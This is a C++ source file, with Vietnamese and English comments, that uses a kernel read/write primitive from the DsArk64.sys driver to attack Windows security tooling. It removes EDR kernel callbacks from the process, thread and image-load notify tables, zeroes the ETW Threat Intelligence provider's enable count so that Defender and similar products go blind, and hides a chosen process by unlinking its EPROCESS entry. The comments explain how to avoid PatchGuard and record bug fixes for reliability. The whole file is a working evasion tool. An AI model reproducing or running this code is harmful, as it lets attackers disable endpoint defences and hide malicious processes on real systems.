/*
 * dsark64_attack.cpp
 *
 * Attack chains dùng DsArk64.sys kernel read/write primitive.
 *
 * Kỹ thuật:
 *  1. DsArkRemoveCallbacks  — xóa EDR callback entries khỏi Psp*NotifyRoutine tables
 *  2. DsArkDisableEtwTI     — vô hiệu hóa ETW Threat Intelligence provider
 *  3. DsArkDKOM_HideProcess — unlink EPROCESS khỏi PsActiveProcessLinks
 *
 * Không trigger KPP vì:
 *  - PspCreate*/PspLoadImage* callback tables không trong KPP guarded region
 *  - ETW_REG_ENTRY.EnableCount nằm trong nonpaged pool, không bị KPP monitor
 *  - EPROCESS fields (UniqueProcessId, ActiveProcessLinks) không bị KPP monitor
 */

#include "dsark64.h"
#include <winternl.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// NtQuerySystemInformation prototype
// ---------------------------------------------------------------------------
typedef NTSTATUS (NTAPI *pfnNtQSI)(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
);

#define SystemModuleInformation 11

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    CHAR    FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG                           NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION  Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// ---------------------------------------------------------------------------
// Internal: lấy danh sách kernel modules qua NtQuerySystemInformation
// Caller phải HeapFree kết quả.
// ---------------------------------------------------------------------------
static PRTL_PROCESS_MODULES GetSystemModules()
{
    pfnNtQSI NtQSI = (pfnNtQSI)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return NULL;

    ULONG size = 0x100000;
retry:
    PVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    if (!buf) return NULL;

    NTSTATUS st = NtQSI(SystemModuleInformation, buf, size, &size);
    if (st == 0xC0000004L /*STATUS_INFO_LENGTH_MISMATCH*/) {
        HeapFree(GetProcessHeap(), 0, buf);
        size *= 2;
        goto retry;
    }
    if (st != 0) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    return (PRTL_PROCESS_MODULES)buf;
}

// ---------------------------------------------------------------------------
// Internal: lấy kernel base (ntoskrnl.exe) và size — module[0]
// ---------------------------------------------------------------------------
static uint64_t GetKernelBase(PRTL_PROCESS_MODULES mods, SIZE_T* pKernSize)
{
    if (!mods || mods->NumberOfModules == 0) return 0;
    if (pKernSize) *pKernSize = mods->Modules[0].ImageSize;
    return (uint64_t)mods->Modules[0].ImageBase;
}

static BOOL GetDriverInfo(PRTL_PROCESS_MODULES mods,
                          const WCHAR* driverName,
                          uint64_t* pBase, SIZE_T* pSize)
{
    for (ULONG i = 0; i < mods->NumberOfModules; i++) {
        const char* p = mods->Modules[i].FullPathName
                      + mods->Modules[i].OffsetToFileName;
        WCHAR wName[256] = {0};
        MultiByteToWideChar(CP_ACP, 0, p, -1, wName, 256);
        if (_wcsicmp(wName, driverName) == 0) {
            *pBase = (uint64_t)mods->Modules[i].ImageBase;
            *pSize = mods->Modules[i].ImageSize;
            return TRUE;
        }
    }
    return FALSE;
}

// ---------------------------------------------------------------------------
// Internal: load ntoskrnl.exe từ disk (LOAD_LIBRARY_AS_IMAGE_RESOURCE),
//           parse PE export table, return kernel VA của exported symbol.
//
// FIX (Bug 1): LOAD_LIBRARY_AS_IMAGE_RESOURCE sets bit 1 of the returned
// HMODULE as a flag (not bit 0). The actual image base is hImg with low 2 bits
// cleared — NOT rounded down to 64KB boundary with & ~0xFFFF.
// While & ~0xFFFF happens to work today (DLLs are 64KB-aligned), it is
// semantically wrong and would break if the loader ever changes.
// Correct: & ~3  (strips both flag bits 0 and 1).
// ---------------------------------------------------------------------------
static uint64_t GetKernelExportAddr(uint64_t kernBase, const char* funcName)
{
    WCHAR sysPath[MAX_PATH];
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hImg = LoadLibraryExW(sysPath, NULL,
                                  DONT_RESOLVE_DLL_REFERENCES |
                                  LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!hImg) return 0;

    // FIX (Bug 1): strip the low 2 flag bits, not 16 bits.
    BYTE* base = (BYTE*)((uintptr_t)hImg & ~(uintptr_t)3);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { FreeLibrary(hImg); return 0; }
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRVA) { FreeLibrary(hImg); return 0; }

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exportRVA);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD* )(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    uint64_t result = 0;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (strcmp(name, funcName) == 0) {
            DWORD rva = funcs[ords[i]];
            result = kernBase + rva;
            break;
        }
    }
    FreeLibrary(hImg);
    return result;
}

// ---------------------------------------------------------------------------
// Internal: parse ntoskrnl PE sections, return VA + size of named section.
//
// Used to restrict LEA scans to .data (callback table storage) and to
// locate .rdata (where GUID constants live) and .data (where handles live).
// ---------------------------------------------------------------------------
static BOOL GetNtoskrnlSection(uint64_t kernBase,
                                const char* sectName,
                                uint64_t* pSectBase,
                                SIZE_T*   pSectSize)
{
    WCHAR sysPath[MAX_PATH];
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\ntoskrnl.exe");

    HMODULE hImg = LoadLibraryExW(sysPath, NULL,
                                  DONT_RESOLVE_DLL_REFERENCES |
                                  LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (!hImg) return FALSE;

    // Strip flag bits (same fix as GetKernelExportAddr)
    BYTE* base = (BYTE*)((uintptr_t)hImg & ~(uintptr_t)3);

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    BOOL found = FALSE;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        // Section names are exactly 8 bytes; may not be null-terminated if 8 chars long.
        // Copy into 9-byte buffer and null-terminate before strcmp, so we can safely
        // compare against a normal C string like ".data" or ".rdata".
        char name9[9] = {0};
        memcpy(name9, sec[i].Name, 8);
        if (strcmp(name9, sectName) == 0) {
            *pSectBase = kernBase + sec[i].VirtualAddress;
            *pSectSize = sec[i].Misc.VirtualSize;
            found = TRUE;
            break;
        }
    }

    FreeLibrary(hImg);
    return found;
}

// ---------------------------------------------------------------------------
// Internal: scan first ~0x200 bytes of a kernel function for
//           LEA r?x, [rip+disp32] patterns pointing into a specified range.
//
// Pattern: REX prefix (0x40..0x4F) + 0x8D + ModRM(bits[7:6]=00,bits[2:0]=101)
//          + 4-byte signed RIP-relative displacement
// ---------------------------------------------------------------------------
static uint64_t FindLEATarget(HANDLE hDev, uint64_t funcAddr,
                               uint64_t dataBase, SIZE_T dataSize)
{
    uint8_t code[0x200] = {0};
    if (!DsArkKernReadEx(hDev, funcAddr, code, sizeof(code)))
        return 0;

    for (int i = 0; i < (int)sizeof(code) - 7; i++) {
        uint8_t rex = code[i];
        if ((rex & 0xF0) != 0x40) continue;   // REX prefix
        if (code[i+1] != 0x8D) continue;      // LEA opcode
        uint8_t modrm = code[i+2];
        if ((modrm & 0xC7) != 0x05) continue; // ModRM = [RIP+disp32]

        int32_t disp;
        memcpy(&disp, &code[i+3], 4);
        // next_insn = funcAddr + i + 7  (1 REX + 1 opcode + 1 ModRM + 4 disp)
        uint64_t target = funcAddr + i + 7 + disp;

        if (target >= dataBase && target < dataBase + dataSize)
            return target;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Internal: find the kernel callback table address by scanning the exported
//           "setter" function for a LEA into ntoskrnl .data.
//
// FIX (Bug 7): previously passed kernBase/kernSize (entire image) as the
// LEA target range, which could match any .rdata, .text, or .data address.
// Callback tables (PspCreate*NotifyRoutine) live in .data only — restrict
// the scan to that section to avoid false positives.
// ---------------------------------------------------------------------------
static uint64_t FindCallbackTable(HANDLE hDev,
                                  uint64_t kernBase, SIZE_T kernSize,
                                  const char* exportedFunc)
{
    uint64_t funcAddr = GetKernelExportAddr(kernBase, exportedFunc);
    if (!funcAddr) return 0;

    // FIX (Bug 7): restrict LEA target range to .data section only.
    uint64_t dataBase = 0;
    SIZE_T   dataSize = 0;
    if (!GetNtoskrnlSection(kernBase, ".data", &dataBase, &dataSize)) {
        // Fallback to entire image if section parse fails (less precise)
        dataBase = kernBase;
        dataSize = kernSize;
    }

    return FindLEATarget(hDev, funcAddr, dataBase, dataSize);
}

// ---------------------------------------------------------------------------
// Internal: scan a callback table (max 64 entries × 8 bytes each),
//           zero out entries belonging to targetDriver.
//
// Each entry is an EX_FAST_REF — a pointer with ref-count in the low bits.
//
// FIX (Bug 2): EX_FAST_REF uses the low 4 bits for the reference count,
// not 2 bits. Using & ~3 leaves bits 2-3 set and gives a wrong (unaligned)
// pointer into the callback block. Must use & ~0xF.
// ---------------------------------------------------------------------------
static DWORD RemoveCallbacksFromTable(HANDLE hDev,
                                      uint64_t tableAddr,
                                      uint64_t targetBase, SIZE_T targetSize)
{
    DWORD removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = 0;
        if (!DsArkKernRead(hDev, tableAddr + i * 8, &entry, 8)) continue;
        if (!entry) continue;

        // FIX (Bug 2): EX_FAST_REF has 4 low bits for RefCnt (not 2).
        uint64_t cbPtr = entry & ~(uint64_t)0xF;

        // Read function pointer inside EX_CALLBACK_ROUTINE_BLOCK (+0x08)
        uint64_t funcPtr = 0;
        if (!DsArkKernRead(hDev, cbPtr + 8, &funcPtr, 8)) continue;

        // Check if callback function belongs to target driver
        if (funcPtr >= targetBase && funcPtr < targetBase + targetSize) {
            uint64_t zero = 0;
            if (DsArkKernWrite(hDev, tableAddr + i * 8, &zero, 8))
                removed++;
        }
    }
    return removed;
}

// ---------------------------------------------------------------------------
// DsArkRemoveCallbacks — xóa tất cả kernel callbacks của một EDR driver
//
// Removes from 3 tables:
//   PspCreateProcessNotifyRoutine   (process create/exit)
//   PspCreateThreadNotifyRoutine    (thread create/exit)
//   PspLoadImageNotifyRoutine       (DLL/image load)
//
// Return: TRUE nếu xóa được ít nhất 1 entry
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkRemoveCallbacks(HANDLE hDev, const WCHAR* targetDriverName)
{
    PRTL_PROCESS_MODULES mods = GetSystemModules();
    if (!mods) return FALSE;

    SIZE_T kernSize = 0;
    uint64_t kernBase = GetKernelBase(mods, &kernSize);

    uint64_t targetBase = 0;
    SIZE_T   targetSize = 0;
    if (!GetDriverInfo(mods, targetDriverName, &targetBase, &targetSize)) {
        HeapFree(GetProcessHeap(), 0, mods);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, mods);

    // Exported symbols whose code references the callback table via LEA
    static const char* kExports[] = {
        "PsSetCreateProcessNotifyRoutineEx",
        "PsSetCreateProcessNotifyRoutine",    // fallback (older builds)
        "PsSetCreateThreadNotifyRoutineEx",
        "PsSetCreateThreadNotifyRoutine",
        "PsSetLoadImageNotifyRoutineEx",
        "PsSetLoadImageNotifyRoutine",
    };

    DWORD    totalRemoved = 0;
    uint64_t found[3]     = {0};
    int      foundIdx     = 0;

    for (int e = 0; e < 6 && foundIdx < 3; e++) {
        uint64_t tableAddr = FindCallbackTable(hDev, kernBase, kernSize, kExports[e]);
        if (!tableAddr) continue;

        // De-duplicate (Process table has 2 export variants pointing same address)
        BOOL dup = FALSE;
        for (int k = 0; k < foundIdx; k++)
            if (found[k] == tableAddr) { dup = TRUE; break; }
        if (dup) continue;

        found[foundIdx++] = tableAddr;
        totalRemoved += RemoveCallbacksFromTable(hDev, tableAddr,
                                                  targetBase, targetSize);
    }

    return totalRemoved > 0;
}

// ---------------------------------------------------------------------------
// DsArkDisableEtwTI — vô hiệu hóa ETW Threat Intelligence provider
//
// REWRITE (Bug 4): Original code searched backward from the GUID address in
// ntoskrnl .rdata for an ETW_REG_ENTRY. This is WRONG — ETW_REG_ENTRY is
// allocated by EtwRegister() in NONPAGED POOL (kernel heap), which is a
// completely separate memory region from ntoskrnl static data. The backward
// search could never find it.
//
// Correct strategy:
//   1. Find the ETW-TI GUID in ntoskrnl .rdata → guidAddr
//   2. Scan ntoskrnl .data for EtwThreatIntProvRegHandle:
//      A REGHANDLE (uint64_t) whose VALUE is the address of an ETW_REG_ENTRY
//      in pool. We identify it by checking that *(value + 0x10) == guidAddr
//      (ProviderId field of ETW_REG_ENTRY points to the GUID).
//   3. Zero EnableCount at ETW_REG_ENTRY + 0x20.
//
// After disable: Defender, MDE, Sentinel lose kernel-level TI events
// (process hollowing, credential access, DLL injection, etc.)
//
// ETW_REG_ENTRY layout (Win10 1607 – Win11 22H2):
//   +0x00  LIST_ENTRY  GuidListEntry   (Flink, Blink)
//   +0x10  GUID*       ProviderId      ← points to our GUID in .rdata
//   +0x18  ...
//   +0x20  LONG        EnableCount     ← set to 0 to disable
//   (some builds have EnableCount at +0x28; if TI persists, try that)
// ---------------------------------------------------------------------------

// ETW-TI GUID {54849625-5478-4994-A5BA-3E3B0328C30D} in GUID struct byte order
// (Data1/2/3 little-endian, Data4 big-endian — i.e. raw in-memory bytes)
static const uint8_t ETW_TI_GUID[16] = {
    0x25,0x96,0x84,0x54,  0x78,0x54,  0x94,0x49,
    0xA5,0xBA,  0x3E,0x3B,0x03,0x28,0xC3,0x0D
};

extern "C" BOOL DsArkDisableEtwTI(HANDLE hDev)
{
    PRTL_PROCESS_MODULES mods = GetSystemModules();
    if (!mods) return FALSE;

    SIZE_T   kernSize = 0;
    uint64_t kernBase = GetKernelBase(mods, &kernSize);
    HeapFree(GetProcessHeap(), 0, mods);
    if (!kernBase) return FALSE;

    // — Step 1: Find .rdata section (GUID lives here) and .data section
    //           (EtwThreatIntProvRegHandle variable lives here)
    uint64_t rdataBase = 0;  SIZE_T rdataSize = 0;
    uint64_t dataBase  = 0;  SIZE_T dataSize  = 0;

    if (!GetNtoskrnlSection(kernBase, ".rdata", &rdataBase, &rdataSize)) {
        // Fallback: scan first 8MB of image
        rdataBase = kernBase;
        rdataSize = min(kernSize, (SIZE_T)0x800000);
    }
    if (!GetNtoskrnlSection(kernBase, ".data", &dataBase, &dataSize)) {
        return FALSE;  // Cannot locate .data — no handle to scan
    }

    // — Step 2: Scan .rdata for the 16-byte ETW-TI GUID pattern.
    //   Read 32 bytes per IOCTL call, step 16 bytes to cover every
    //   4-byte-aligned position (GUID is 4-byte aligned).
    uint64_t guidAddr = 0;
    uint8_t  chunk[32] = {0};

    for (SIZE_T off = 0; off + 16 <= rdataSize && !guidAddr; off += 16) {
        DWORD readLen = (DWORD)min((SIZE_T)32, rdataSize - off);
        if (!DsArkKernReadEx(hDev, rdataBase + off, chunk, readLen)) continue;

        for (int j = 0; j + 16 <= (int)readLen; j += 4) {
            if (memcmp(chunk + j, ETW_TI_GUID, 16) == 0) {
                guidAddr = rdataBase + off + j;
                break;
            }
        }
    }

    if (!guidAddr) return FALSE;

    // — Step 3: Scan .data for EtwThreatIntProvRegHandle.
    //   Read 32 bytes (4 QWORDs) per call, filter for valid kernel pointers,
    //   then check [candidate + 0x10] == guidAddr for each promising value.
    //
    //   "Valid kernel pointer" on x64 Windows: canonical high-half address,
    //   i.e. value >= 0xFFFF800000000000.
    uint64_t entryAddr = 0;
    uint8_t  dataBuf[32] = {0};

    for (SIZE_T off = 0; off + 8 <= dataSize && !entryAddr; off += 32) {
        DWORD readLen = (DWORD)min((SIZE_T)32, dataSize - off);
        if (!DsArkKernReadEx(hDev, dataBase + off, dataBuf, readLen)) continue;

        for (DWORD j = 0; j + 8 <= readLen; j += 8) {
            uint64_t candidate = 0;
            memcpy(&candidate, dataBuf + j, 8);

            // Quick filter: must be a canonical kernel virtual address
            if (candidate < 0xFFFF800000000000ULL || candidate == 0) continue;

            // Read ProviderId field at [candidate + 0x10]
            uint64_t provId = 0;
            if (!DsArkKernRead(hDev, candidate + 0x10, &provId, 8)) continue;

            if (provId == guidAddr) {
                entryAddr = candidate;
                break;
            }
        }
    }

    if (!entryAddr) return FALSE;

    // — Step 4: Zero EnableCount at ETW_REG_ENTRY + 0x20.
    //   Note: If ETW-TI is still active after this, try patching +0x28 instead.
    //   The exact offset varies slightly between Windows builds.
    uint32_t zero32 = 0;
    return DsArkKernWrite(hDev, entryAddr + 0x20, &zero32, sizeof(zero32));
}

// ---------------------------------------------------------------------------
// DsArkDKOM_HideProcess — unlink process từ PsActiveProcessLinks
//
// Cần: kernel read/write primitive + kernel base + EPROCESS offsets.
//
// Common ActiveProcessLinks + UniqueProcessId offsets in EPROCESS:
//   Win10 1507–1903: apl=0x2E8, pid=0x2E0
//   Win10 2004+:     apl=0x448, pid=0x440
//   Win11 21H2+:     apl=0x448, pid=0x440
//
// FIX (Bug 3): Original self-loop code used &(uint64_t&)(eproc + apl_offset)
// which takes the address of a temporary rvalue — undefined behavior in C++.
// The compiler may materialize any address or optimize the store away entirely.
// Fix: use an explicit local variable whose address is well-defined.
// ---------------------------------------------------------------------------
extern "C" BOOL DsArkDKOM_HideProcess(HANDLE hDev,
                                       uint64_t kernBase,
                                       DWORD    targetPid,
                                       DWORD    apl_offset,
                                       DWORD    pid_offset)
{
    if (!kernBase || !apl_offset || !pid_offset) return FALSE;

    // PsInitialSystemProcess → address of System EPROCESS
    uint64_t sysProcAddr = GetKernelExportAddr(kernBase, "PsInitialSystemProcess");
    if (!sysProcAddr) return FALSE;

    uint64_t sysEproc = 0;
    if (!DsArkKernRead(hDev, sysProcAddr, &sysEproc, 8)) return FALSE;

    // Walk PsActiveProcessLinks list
    uint64_t listHead = sysEproc + apl_offset;
    uint64_t current  = listHead;
    BOOL     found    = FALSE;

    for (int i = 0; i < 1024; i++) {
        uint64_t flink = 0;
        if (!DsArkKernRead(hDev, current, &flink, 8)) break;
        if (!flink || flink == listHead) break;   // end of list

        uint64_t eproc = flink - apl_offset;

        uint64_t pid = 0;
        if (!DsArkKernRead(hDev, eproc + pid_offset, &pid, 8)) break;

        if ((DWORD)pid == targetPid) {
            // Read target's LIST_ENTRY {Flink, Blink}
            uint64_t tgt_flink = 0, tgt_blink = 0;
            if (!DsArkKernRead(hDev, eproc + apl_offset,     &tgt_flink, 8)) break;
            if (!DsArkKernRead(hDev, eproc + apl_offset + 8, &tgt_blink, 8)) break;

            // Unlink: prev->Flink = our Flink
            if (!DsArkKernWrite(hDev, tgt_blink,     &tgt_flink, 8)) break;
            // Unlink: next->Blink = our Blink
            if (!DsArkKernWrite(hDev, tgt_flink + 8, &tgt_blink, 8)) break;

            // FIX (Bug 3): Self-loop the hidden process's LIST_ENTRY to prevent
            // crash if the kernel later tries to walk/remove it.
            // Use a local variable — &(T&)(expr) on an rvalue is undefined behavior.
            uint64_t selfLink = eproc + apl_offset;
            DsArkKernWrite(hDev, eproc + apl_offset,     &selfLink, 8);  // Flink = self
            DsArkKernWrite(hDev, eproc + apl_offset + 8, &selfLink, 8);  // Blink = self

            found = TRUE;
            break;
        }
        current = flink;
    }
    return found;
}

// ---------------------------------------------------------------------------
// DsArkGetKernelExport — public wrapper để test harness dùng
// (GetKernelExportAddr là static, không accessible trực tiếp từ test.cpp)
// ---------------------------------------------------------------------------
extern "C" uint64_t DsArkGetKernelExport(uint64_t kernBase, const char* funcName)
{
    return GetKernelExportAddr(kernBase, funcName);
}
